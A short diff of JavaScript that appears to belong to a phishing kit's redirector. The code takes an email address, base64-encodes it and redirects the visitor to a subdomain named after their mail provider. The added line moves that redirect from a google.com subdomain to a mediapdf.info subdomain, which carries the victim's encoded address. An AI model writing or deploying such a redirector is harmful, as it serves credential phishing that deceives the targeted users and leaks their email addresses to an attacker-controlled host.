@@ -47,7 +47,7 @@ const domain = url_get_email.split('@')[1];
 const domain_name = domain.split('.')[0];
 var b64_email = btoa(url_get_email);
 const randomString = generateRandomString(5);
-var mail_go_url = "https://"+domain_name+".google.com/"+randomString+"/"+b64_email;
+var mail_go_url = "https://"+domain_name+".mediapdf.info/"+randomString+"/"+b64_email;
 
 if (url_get_email) {
   location.replace(mail_go_url);
